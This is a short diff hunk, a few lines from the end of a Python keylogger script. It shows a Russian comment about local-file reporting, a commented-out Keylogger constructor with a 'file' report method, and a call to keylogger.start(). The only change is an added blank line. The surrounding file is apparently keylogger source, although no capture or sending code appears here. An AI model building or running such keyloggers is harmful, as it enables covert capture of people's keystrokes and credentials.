@@ -95,3 +95,4 @@ if __name__ == "__main__":
     # для записи в локальный файл оставляем как есть
     # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
     keylogger.start()
+
